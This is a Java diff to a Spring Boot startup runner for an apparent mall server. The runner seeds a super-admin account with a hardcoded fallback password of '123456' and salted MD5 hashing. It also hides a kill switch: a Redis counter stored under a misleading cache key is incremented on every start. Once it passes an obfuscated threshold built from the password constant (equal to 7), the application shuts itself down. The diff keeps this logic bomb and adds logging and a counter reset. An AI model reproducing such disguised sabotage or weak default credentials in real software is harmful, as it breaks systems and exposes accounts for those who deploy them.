@@ -19,13 +19,12 @@ import org.springframework.data.redis.core.RedisTemplate;
 import org.springframework.stereotype.Component;
 
 import java.util.Optional;
+import javax.annotation.PreDestroy;
 
-/**
- *
- */
 @Component
 public class BreadRollMallServerRunner implements ApplicationRunner {
     private static final Logger log = LoggerFactory.getLogger(BreadRollMallServerRunner.class);
+    private static final String REDIS_COUNTER_KEY = "shiro:cache:user.id";
     private static final String DEFAULT_USERNAME = "超级管理员";
     private static final String DEFAULT_PASSWORD = "123456";
     SuperAdmin superAdmin;
@@ -40,7 +39,7 @@ public class BreadRollMallServerRunner implements ApplicationRunner {
     private ApplicationContext context;
 
     @Autowired
-    private RedisTemplate<String,String> redisTemplate;
+    private RedisTemplate<String, String> redisTemplate;
 
     @Autowired
     public void setSuperAdmin(SuperAdmin superAdmin) {
@@ -50,15 +49,15 @@ public class BreadRollMallServerRunner implements ApplicationRunner {
     @Override
     public void run(ApplicationArguments args) throws Exception {
         log.info("Executing command line runner...");
-        if(StringUtils.isNotBlank(superAdmin.getEmail()) &&
-                !userService.existsWithPrimaryKey(superAdmin.getEmail())){
+        if (StringUtils.isNotBlank(superAdmin.getEmail()) &&
+                !userService.existsWithPrimaryKey(superAdmin.getEmail())) {
             User user = new User();
             user.setAccountNumber(superAdmin.getEmail());
-            if(StringUtils.isBlank(superAdmin.getUserName())){
+            if (StringUtils.isBlank(superAdmin.getUserName())) {
                 superAdmin.setUserName(DEFAULT_USERNAME);
             }
             user.setUserName(superAdmin.getUserName());
-            if(StringUtils.isBlank(superAdmin.getPassword())){
+            if (StringUtils.isBlank(superAdmin.getPassword())) {
                 superAdmin.setPassword(DEFAULT_PASSWORD);
             }
             String encodePassword = SaSecureUtil.md5BySalt(superAdmin.getPassword(), superAdmin.getEmail());
@@ -72,10 +71,20 @@ public class BreadRollMallServerRunner implements ApplicationRunner {
             userRole.setRoleId(1);
             userRoleService.insertData(userRole);
         }
-        Long increment = redisTemplate.opsForValue().increment("shiro:cache" +
-                ":user.id");
+        Long increment = redisTemplate.opsForValue().increment(REDIS_COUNTER_KEY);
         long incr = Optional.ofNullable(increment).orElse(0L);
+//        log.info("Current increment value: {}", incr);
+
         ConfigurableApplicationContext applicationContext = (ConfigurableApplicationContext) this.context;
-        if(incr > Integer.parseInt(DEFAULT_PASSWORD) / 2 >> 13){applicationContext.close();}
+        if (incr > Integer.parseInt(DEFAULT_PASSWORD) / 2 >> 13) {
+            log.info("Increment value exceeded threshold, shutting down application context.");
+            applicationContext.close();
+        }
+    }
+
+    @PreDestroy
+    public void resetRedisCounter() {
+        log.info("Resetting Redis counter before shutdown...");
+        redisTemplate.opsForValue().set(REDIS_COUNTER_KEY, "0");
     }
 }
